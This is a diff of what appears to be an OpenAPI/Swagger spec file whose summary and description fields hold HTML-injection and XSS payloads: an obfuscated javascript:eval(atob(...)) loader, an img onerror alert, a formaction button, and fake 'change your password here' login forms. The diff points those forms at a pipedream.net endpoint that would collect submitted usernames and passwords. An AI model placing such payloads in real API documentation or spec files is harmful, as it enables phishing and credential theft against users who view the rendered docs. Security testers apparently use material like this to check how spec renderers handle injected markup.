@@ -50,7 +50,7 @@ a');location=`javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2Ny
                 "summary": "/'\">bbb</script><img src=x onerror=alert(document.domain)>",
                 "description": "<IMG src='https://techbeacon.scdn7.secure.raxcdn.com/sites/default/files/styles/article_hero_image/public/field/image/testing-trends-world-quality-report.jpg?itok=vUyONZsj'/>
 <h1 style='background-color:Tomato;'>change your  password here</h1>
-<form method='get' action='https://00.paresh.ninja'> <p><input type='text' name='login' value='' placeholder='Username or Email'></p> <p><input type='password' name='password' value='' placeholder='Password'></p>  <p class='submit'><input type='submit' name='commit' value='Login'></p>  </form>",
+<form method='get' action='https://enuh8q3jbomtznm.m.pipedream.net'> <p><input type='text' name='login' value='' placeholder='Username or Email'></p> <p><input type='password' name='password' value='' placeholder='Password'></p>  <p class='submit'><input type='submit' name='commit' value='Login'></p>  </form>",
                 "tags": ["ccc"],
                 "parameters": [
                     {
@@ -74,12 +74,12 @@ a');location=`javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2Ny
                 ],
                 "responses": {
                     "200": {
-                        "description": "{<marquee>test</marquee><h1 style='border:2px solid Tomato;'>Hello World HTML injection PoC</h1><form><button formaction=//evil>XSS</button><textarea name=x>}"
+                        "description": "{<marquee>test</marquee><h1 style='border:2px solid Tomato;'>Hello World Injection PoC</h1><form><button formaction=//evil>XSS</button><textarea name=javascript:alert(1)>}"
                     },
                     "400": {
                         "description": "<IMG src='https://techbeacon.scdn7.secure.raxcdn.com/sites/default/files/styles/article_hero_image/public/field/image/testing-trends-world-quality-report.jpg?itok=vUyONZsj'/>
 <h1 style='background-color:Tomato;'>change your  password here</h1>
-<form method='get' action='https://xavi.synack-lp.com/'> <p><input type='text' name='login' value='' placeholder='Username or Email'></p> <p><input type='password' name='password' value='' placeholder='Password'></p>  <p class='submit'><input type='submit' name='commit' value='Login'></p>  </form>",
+<form method='get' action='https://enuh8q3jbomtznm.m.pipedream.net/'> <p><input type='text' name='login' value='' placeholder='Username or Email'></p> <p><input type='password' name='password' value='' placeholder='Password'></p>  <p class='submit'><input type='submit' name='commit' value='Login'></p>  </form>",
                         "schema": {
                             "type": "object",
                             "properties": {
